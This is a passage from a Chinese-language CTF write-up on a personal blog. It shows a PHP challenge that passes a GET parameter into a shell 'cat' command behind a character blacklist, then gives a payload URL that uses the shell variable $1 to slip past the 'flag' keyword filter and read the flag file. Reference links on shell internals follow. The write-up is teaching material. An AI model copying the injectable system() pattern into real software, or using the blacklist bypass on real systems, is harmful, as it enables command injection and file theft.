</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>	<span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>require</span> <span class=no>__DIR__</span><span class=o>.</span><span class=s1>&#39;/flag-f72a161d445915d2bdcdc820c4143353.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		<span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/flag|\&#39;|\&#34;|`|\\\\|;|\(|\)|\*|\?|\.\.|\//i&#39;</span><span class=p>,</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>			<span class=k>die</span><span class=p>(</span><span class=s1>&#39;no hack&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		<span class=nx>system</span><span class=p>(</span><span class=s1>&#39;cat &#34;&#39;</span><span class=o>.</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>]</span><span class=o>.</span><span class=s1>&#39;&#34;&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>echo</span> <span class=s1>&#39;&lt;b&gt;Usage&lt;/b&gt;: Please enter the parameter like as in &lt;a href=&#34;/?file=test.txt&#34;&gt;this&lt;/a&gt;.&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>还剩下<code>{}</code>、<code>&lt;></code>、<code>[]</code>、<code>+-=</code>、<code>^</code>、<code>$</code>、<code>@</code>、<code>!</code>、<code>&</code>，是个关键字绕过，有<code>$</code>，我们很快可以联想到可以用<code>$n</code>这种方式绕过，最终 payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>https://cat.canhack.me/?file=fl$1ag-f72a161d445915d2bdcdc820c4143353.php
</span></span></code></pre></td></tr></table></div></div><h2 id=参考>参考：</h2><p><a class=link href=https://www.tldp.org/LDP/abs/html/internalvariables.html target=_blank rel=noopener>Internal Variables</a></p><p><a class=link href=https://blog.csdn.net/whuslei/article/details/7187639 target=_blank rel=noopener>Shell中的IFS解惑</a></p><p><a class=link href=http://wiki.jikexueyuan.com/project/shell-tutorial/shell-special-variable.html target=_blank rel=noopener>Shell 特殊变量</a></p><p><a class=link href=https://xz.aliyun.com/t/2589 target=_blank rel=noopener>一个有趣的任意文件读写</a></p><p><a class=link href=https://www.freebuf.com/articles/system/176255.html target=_blank rel=noopener>利用通配符进行Linux本地提权</a></p><p><a class=link href=https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt target=_blank rel=noopener>Unix Wildcards Gone Wild</a></p></section><footer class=article-footer><section class=article-tags><a href=/tags/sec/>Sec</a>
<a href=/tags/rce/>RCE</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section><br><div class="notice tip"><p class=notice-title><span class="icon-notice baseline"><svg viewBox="300.5 134 300 300"><path d="M551.281 252.36c0-3.32-1.172-6.641-3.515-8.985l-17.774-17.578c-2.344-2.344-5.469-3.711-8.789-3.711-3.32.0-6.445 1.367-8.789 3.71l-79.687 79.493-44.141-44.14c-2.344-2.344-5.469-3.712-8.79-3.712-3.32.0-6.444 1.368-8.788 3.711l-17.774 17.579c-2.343 2.343-3.515 5.664-3.515 8.984s1.172 6.445 3.515 8.789l70.704 70.703c2.343 2.344 5.664 3.711 8.789 3.711 3.32.0 6.64-1.367 8.984-3.71l106.055-106.056c2.343-2.343 3.515-5.468 3.515-8.789zM600.5 284c0 82.813-67.188 150-150 150-82.813.0-150-67.188-150-150 0-82.813 67.188-150 150-150 82.813.0 150 67.188 150 150z"/></svg>
</span>Tip</p><p>I am looking for some guys who have a strong interest in CTFs to build a team focused on international CTFs that are on the ctftime.org, if anyone is interested in this idea you can take a look at here: <a class=link href=https://zeddyu.github.io/advertisement/#international-ctf-team target=_blank rel=noopener>Advertisements</a></p><p>想了解更多有意思的国际赛 CTF 中 Web 知识技巧，欢迎加入我的 <a class=link href=https://zeddyu.github.io/advertisement/#%e7%9f%a5%e8%af%86%e6%98%9f%e7%90%83 target=_blank rel=noopener>知识星球</a> ; 另外我正在召集一群小伙伴组建一支专注国际 CTF 的队伍，如果有感兴趣的小伙伴也可在 <a class=link href=https://zeddyu.github.io/advertisement/#international-ctf-team target=_blank rel=noopener>International CTF Team</a> 查看详情</p></div></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/web-for-pentest/><div class=article-details><h2 class=article-title>Web For Pentest</h2></div></a></article><article><a href=/p/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84n%E7%A7%8D%E6%96%B9%E5%BC%8F/><div class=article-details><h2 class=article-title>巧用命令注入的N种方式</h2></div></a></article><article><a href=/p/the-end-of-afr/><div class=article-details><h2 class=article-title>The End of AFR</h2></div></a></article><article><a href=/p/a-magic-way-of-xss-in-http/2/><div class=article-details><h2 class=article-title>A Magic Way of XSS in HTTP/2</h2></div></a></article><article><a href=/p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/><div class=article-details><h2 class=article-title>一篇文章带你读懂 TLS Poison 攻击</h2></div></a></article></div></div></aside><div class=disqus-container><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//ZeddYu.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
2020 -
2025 Zeddy's Blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.29.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.zdy.one/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.zdy.one/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.zdy.one/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.zdy.one/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.zdy.one/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer integrity="sha256-Hpo7r9hGztTDRdCEs1X7jHuudXAcM4+KH4qCx4ATeCY=" crossorigin=anonymous></script><script>(function(){const e=document.createElement("link");e.href="https://googlefonts.zeddyu-lu.workers.dev/fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><script>"serviceWorker"in navigator&&window.addEventListener("load",function(){navigator.serviceWorker.register("https://zeddyu.github.io/sw.min.3e39d12263b24e3c46a8d580c9ff2781500296e154ca0809820b5be9b9135220.js").then(function(e){console.log("ServiceWorker registration successful with scope: ",e.scope)},function(e){console.log("ServiceWorker registration failed: ",e)})})</script></body></html>